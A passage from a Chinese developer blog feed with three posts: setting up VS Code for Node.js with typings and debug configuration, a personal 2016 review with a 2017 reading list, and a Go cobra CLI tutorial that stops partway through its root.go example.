    <content type="html"><![CDATA[<p>文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。<br><a id="more"></a></p>
<h2 id="VSCode简介"><a href="#VSCode简介" class="headerlink" title="VSCode简介"></a>VSCode简介</h2><p>VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。</p>
<h2 id="安装VSCode"><a href="#安装VSCode" class="headerlink" title="安装VSCode"></a>安装VSCode</h2><p>可以通过<a href="https://code.visualstudio.com/Download" target="_blank" rel="external">官方下载</a>, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用<a href="https://pan.baidu.com/s/1kU5OCOB#list/path=%2Fpub%2Fvscode" target="_blank" rel="external">国内镜像</a>,直接下mac版本的安装包，安装。</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>在VS Code中，我们可以非常方便地运行JavaScript文件。</p>
<p>VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。</p>
<p>假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">hello/ &lt;-- workspace dir</div><div class="line">|</div><div class="line">+- hello.js &lt;-- JavaScript file</div><div class="line">|</div><div class="line">+- .vscode/  &lt;-- VS Code config</div><div class="line">   |</div><div class="line">   +- launch.json &lt;-- VS Code config file <span class="keyword">for</span> JavaScript</div></pre></td></tr></table></figure></p>
<p>然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的<a href="https://code.visualstudio.com/Docs/languages/javascript" target="_blank" rel="external">JavaScript in VS Code</a></p>
<h2 id="智能提示"><a href="#智能提示" class="headerlink" title="智能提示"></a>智能提示</h2><p>因为之前微软推出了<code>typescript</code>语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。</p>
<p>这个功能理所应当也被<code>vscode</code>继承了，但是现在<a href="https://github.com/DefinitelyTyped/tsd" target="_blank" rel="external">tsd</a>项目已经过期了，接过这个接力棒的是<a href="https://github.com/typings/typings" target="_blank" rel="external">typings</a></p>
<p>因此我们将通过Typings来实现JavaScript智能提示功</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote>
<p>安装NPM</p>
</blockquote>
<p><code>NPM</code>是和<code>Node.js</code>一起安装的，如果你想使用NPM的话，那么你应该先安装<code>Node.js</code></p>
<blockquote>
<p>Typings vs TSD</p>
</blockquote>
<p><code>Typings</code>作为<code>TSD</code>的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm rm -g tsd</div></pre></td></tr></table></figure></p>
<blockquote>
<p>CNPM</p>
</blockquote>
<p>在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的<code>NPM镜像</code>，关于淘宝NPM镜像的使用方法可以参考<a href="https://npm.taobao.org/" target="_blank" rel="external">淘宝 NPM 镜像</a></p>
<p>使用下面的命令来进行安装和使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</div><div class="line">cnpm install koa</div></pre></td></tr></table></figure></p>
<h3 id="安装Typings"><a href="#安装Typings" class="headerlink" title="安装Typings"></a>安装Typings</h3><p>我们通过cnpm来安装typings<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ npm install -g typings</div><div class="line"></div><div class="line">maojun@maojun-mbp$ typings -v</div><div class="line">2.0.0</div></pre></td></tr></table></figure></p>
<h3 id="配置智能提示"><a href="#配置智能提示" class="headerlink" title="配置智能提示"></a>配置智能提示</h3><p>安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看<a href="https://github.com/typings/typings" target="_blank" rel="external">typings github</a></p>
<p>使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">typings install dt~node --global --save</div><div class="line">typings install lodash --save</div></pre></td></tr></table></figure></p>
<p>这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp$ tree .</div><div class="line">.</div><div class="line">├── typings</div><div class="line">│   ├── globals</div><div class="line">│   │   └── node</div><div class="line">│   │       ├── index.d.ts</div><div class="line">│   │       └── typings.json</div><div class="line">│   ├── index.d.ts</div><div class="line">│   └── modules</div><div class="line">│       └── lodash</div><div class="line">│           ├── index.d.ts</div><div class="line">│           └── typings.json</div><div class="line">└── typings.json</div></pre></td></tr></table></figure></p>
<p>这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">typings search exampleName</div></pre></td></tr></table></figure></p>
<h3 id="启动智能提示"><a href="#启动智能提示" class="headerlink" title="启动智能提示"></a>启动智能提示</h3><p>配置好了类型接口后，可以通过两种方式来启动提示功能：</p>
<ol>
<li><p>文件头加注释</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/// &lt;reference path="./typings/index.d.ts" /&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>在目录(在这里是<code>NodeSnippet</code>文件夹中)增加一个名为<code>jsconfig.json</code>的空文件</p>
</li>
</ol>
<p>更多jsconfig.json文件的内容可以参考： <a href="https://code.visualstudio.com/Docs/languages/javascript" target="_blank" rel="external">JavaScript in VS Code</a></p>
<p>这样我们写代码的时候就有智能提示功能了， 效果如下:<br><img src="http://oiw1gzfww.bkt.clouddn.com/nodejs_vscode.gif" alt=""></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>如何调试写好了的JS程序喃？</p>
<p>用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。</p>
<p>关于Debug的细节，请参考<a href="https://go.microsoft.com/fwlink/?linkid=830387" target="_blank" rel="external">Debugging</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="comment">// Use IntelliSense to learn about possible Node.js debug attributes.</span></div><div class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></div><div class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></div><div class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</div><div class="line">    <span class="string">"configurations"</span>: [</div><div class="line">        &#123;</div><div class="line">            <span class="string">"type"</span>: <span class="string">"node"</span>,</div><div class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>,</div><div class="line">            <span class="string">"name"</span>: <span class="string">"启动程序"</span>,</div><div class="line">            <span class="string">"program"</span>: <span class="string">"$&#123;workspaceRoot&#125;/app.js"</span>,</div><div class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span></div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            <span class="string">"type"</span>: <span class="string">"node"</span>,</div><div class="line">            <span class="string">"request"</span>: <span class="string">"attach"</span>,</div><div class="line">            <span class="string">"name"</span>: <span class="string">"附加到进程"</span>,</div><div class="line">            <span class="string">"port"</span>: <span class="number">5858</span></div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>效果如下:<br><img src="http://oiw1gzfww.bkt.clouddn.com/nodejs_vscode_debug.gif" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="JavaScript" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/JavaScript/"/>
    
    
      <category term="vscode" scheme="https://blog.yumaojun.net/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>2016总结与2017计划</title>
    <link href="https://blog.yumaojun.net/2016/12/31/2016-summary/"/>
    <id>https://blog.yumaojun.net/2016/12/31/2016-summary/</id>
    <published>2016-12-31T12:03:29.000Z</published>
    <updated>2017-01-02T15:32:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。</p>
<p>记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。</p>
<a id="more"></a>
<h2 id="转瞬即逝的2016"><a href="#转瞬即逝的2016" class="headerlink" title="转瞬即逝的2016"></a>转瞬即逝的2016</h2><p>2016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。</p>
<p>2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。</p>
<p>工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。</p>
<p>还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。</p>
<h2 id="瞬息万变的2017"><a href="#瞬息万变的2017" class="headerlink" title="瞬息万变的2017"></a>瞬息万变的2017</h2><p>变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。<br>伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。</p>
<p>我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单:</p>
<h3 id="Python提升书单-今年主力"><a href="#Python提升书单-今年主力" class="headerlink" title="Python提升书单(今年主力)"></a>Python提升书单(今年主力)</h3><ol>
<li>基础回过<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="external">廖雪峰官网</a></li>
<li>Think Python 2ed 中译版精校  PDF 电子书</li>
</ul>
</li>
<li>进阶深<ul>
<li><a href="http://python3-cookbook.readthedocs.io/zh_CN/latest/preface.html" target="_blank" rel="external">python3-cookbook</a></li>
<li>电子书Python高手之路</li>
</ul>
</li>
<li>常见的一些代码实现<ul>
<li><a href="https://github.com/liquanzhou/ops_doc/blob/master/python%E5%AE%9E%E4%BE%8B%E6%89%8B%E5%86%8C.py" target="_blank" rel="external">python实例手册</a>  </li>
<li><a href="https://segmentfault.com/t/python/blogs" target="_blank" rel="external">网站上的文章</a></li>
</ul>
</li>
<li>设计模式<ul>
<li><a href="http://www.cnblogs.com/wuyuegb2312/archive/2013/04/09/3008320.html" target="_blank" rel="external">快速版大话设计模式</a></li>
<li><a href="https://github.com/faif/python-patterns" target="_blank" rel="external">一些最新的例子</a></li>
<li><a href="http://www.ituring.com.cn/book/1715" target="_blank" rel="external">精通Python设计模式</a></li>
</ul>
</li>
<li>数据结构与算法<ul>
<li><a href="http://top.jobbole.com/4681/" target="_blank" rel="external">快速阅读总结</a></li>
<li>电子书：Data Structures and Algorithms with Python-2015</li>
</ul>
</li>
<li>源码阅读<ul>
<li>Django Class Based View </li>
<li>Flask 源码阅读</li>
<li>Openstack KeyStone 源码阅读</li>
</ul>
</li>
<li>理解Python解释器<ul>
<li><a href="http://mt.sohu.com/20161030/n471778650.shtml" target="_blank" rel="external">用Python实现一个Python解释器</a></li>
</ul>
</li>
</ol>
<h3 id="Golang提升书单"><a href="#Golang提升书单" class="headerlink" title="Golang提升书单"></a>Golang提升书单</h3><ol>
<li>回过基础：<ul>
<li><a href="http://mt.sohu.com/20161030/n471778650.shtml" target="_blank" rel="external">Go Web 编程</a></li>
<li><a href="https://hotsnow.gitbooks.io/the-way-to-go_zh_cn/content/" target="_blank" rel="external">Go入门指南</a></li>
</ul>
</li>
</ol>
<h3 id="JavaScript提升书单"><a href="#JavaScript提升书单" class="headerlink" title="JavaScript提升书单"></a>JavaScript提升书单</h3><ol>
<li>回过基础：<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000" target="_blank" rel="external">廖雪峰官网</a></li>
<li><a href="http://javascript.ruanyifeng.com/#nodejs" target="_blank" rel="external">阮一峰的javascript教程 </a></li>
<li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="external">ECMAScript 6 入门</a></li>
</ul>
</li>
</ol>
<p>除了技术, 还应该有生活。而生活就是: <strong><em>赶紧把账还完</em></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。&lt;/p&gt;
&lt;p&gt;记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。&lt;/p&gt;
    
    </summary>
    
      <category term="杂谈" scheme="https://blog.yumaojun.net/categories/%E6%9D%82%E8%B0%88/"/>
    
      <category term="年终总结" scheme="https://blog.yumaojun.net/categories/%E6%9D%82%E8%B0%88/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="summary" scheme="https://blog.yumaojun.net/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>如何使用golang编写漂亮的命令行工具</title>
    <link href="https://blog.yumaojun.net/2016/12/30/go-cobra/"/>
    <id>https://blog.yumaojun.net/2016/12/30/go-cobra/</id>
    <published>2016-12-30T01:08:22.000Z</published>
    <updated>2017-01-06T06:18:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra<br><a id="more"></a></p>
<h2 id="cobra简介"><a href="#cobra简介" class="headerlink" title="cobra简介"></a>cobra简介</h2><p>Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。<br>它提供的功能有：</p>
<ul>
<li>简易的子命令行模式，如 app server， app fetch等等</li>
<li>完全兼容posix命令行模式</li>
<li>嵌套子命令subcommand</li>
<li>支持全局，局部，串联flags</li>
<li>使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname</li>
<li>如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server</li>
<li>自动生成commands和flags的帮助信息</li>
<li>自动生成详细的help信息，如app help</li>
<li>自动识别-h，–help帮助flag</li>
<li>自动生成应用程序在bash下命令自动完成功能</li>
<li>自动生成应用程序的man手册</li>
<li>命令行别名</li>
<li>自定义help和usage信息</li>
<li>可选的紧密集成的viper apps</li>
</ul>
<p>从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$https_proxy</span>=localhost:8123 go get -v github.com/spf13/cobra/cobra</div></pre></td></tr></table></figure></p>
<p>安装完成后可以看到cobra的一些帮助信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra -h</div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  cobra [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  add         Add a <span class="built_in">command</span> to a Cobra Application</div><div class="line">  init        Initialize a Cobra Application</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --author string        Author name <span class="keyword">for</span> copyright attribution (default <span class="string">"YOUR NAME"</span>)</div><div class="line">      --config string        config file (default is <span class="variable">$HOME</span>/.cobra.yaml)</div><div class="line">  <span class="_">-l</span>, --license license      Name of license <span class="keyword">for</span> the project (can provide license <span class="keyword">in</span> config)</div><div class="line">  -b, --projectbase string   base project directory, e.g. github.com/spf13/</div><div class="line">      --viper                Use Viper <span class="keyword">for</span> configuration (default <span class="literal">true</span>)</div><div class="line"></div><div class="line">Use <span class="string">"cobra [command] --help"</span> <span class="keyword">for</span> more information about a command.</div></pre></td></tr></table></figure></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra init demo</div><div class="line">Your Cobra application is ready at</div><div class="line">/Users/maojun/GoWorkDir/src/demo</div><div class="line">Give it a try by going there and running `go run main.go`</div><div class="line">Add commands to it by running `cobra add [cmdname]`</div></pre></td></tr></table></figure></p>
<p>这个命令会帮你生成这样一个框架代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp$ tree demo</div><div class="line">demo</div><div class="line">├── LICENSE</div><div class="line">├── cmd</div><div class="line">│   └── root.go</div><div class="line">└── main.go</div></pre></td></tr></table></figure></p>
<h3 id="简单的CLI"><a href="#简单的CLI" class="headerlink" title="简单的CLI"></a>简单的CLI</h3><p>在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">demo.exe</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -h, --help          help for demo</div><div class="line">  -n, --name string   person's name</div></pre></td></tr></table></figure></p>
<p>接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ tree .</div><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── cmd</div><div class="line">│   └── root.go</div><div class="line">├── main.go</div><div class="line">└── simple</div><div class="line">    ├── simple.go</div><div class="line">    └── simple_test.go</div></pre></td></tr></table></figure></p>
<p>这里仅仅实现一个print作为样例,因此simple.go是这样实现的<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> simple</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Show</span><span class="params">(name <span class="keyword">string</span>, age <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">    fmt.Printf(<span class="string">"My name is %s, my age is %d\n"</span>, name, age)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。</p>
<ol>
<li>在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()]</li>
<li>在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute()</li>
<li>而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]<br>显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了</li>
</ol>
<p>这里做了几点修改</p>
<ol>
<li>RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口</li>
<li>cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法</li>
<li>最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper”</li>
</ol>
<p>最终这个root.go是这样的<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></div><div class="line"><span class="comment">// You may obtain a copy of the License at</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span class="comment">// See the License for the specific language governing permissions and</span></div><div class="line"><span class="comment">// limitations under the License.</span></div><div class="line"></div><div class="line"><span class="keyword">package</span> cmd</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line"></div><div class="line">	<span class="string">"demo/simple"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/spf13/cobra"</span></div><div class="line">	<span class="comment">// "github.com/spf13/viper"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">//var cfgFile string</span></div><div class="line"><span class="keyword">var</span> name <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> age <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// RootCmd represents the base command when called without any subcommands</span></div><div class="line"><span class="keyword">var</span> RootCmd = &amp;cobra.Command&#123;</div><div class="line">	Use:   <span class="string">"demo"</span>,</div><div class="line">	Short: <span class="string">"A test demo"</span>,</div><div class="line">	Long: <span class="string">`Demo is a test appcation for print things`</span>,</div><div class="line"><span class="comment">// Uncomment the following line if your bare application</span></div><div class="line"><span class="comment">// has an action associated with it:</span></div><div class="line">	Run: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> &#123;</div><div class="line">			cmd.Help()</div><div class="line">			<span class="keyword">return</span></div><div class="line">		&#125;</div><div class="line">		simple.Show(name, age)</div><div class="line">	&#125;,</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Execute adds all child commands to the root command sets flags appropriately.</span></div><div class="line"><span class="comment">// This is called by main.main(). It only needs to happen once to the rootCmd.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Execute</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> err := RootCmd.Execute(); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">		os.Exit(<span class="number">-1</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// cobra.OnInitialize(initConfig)</span></div><div class="line"></div><div 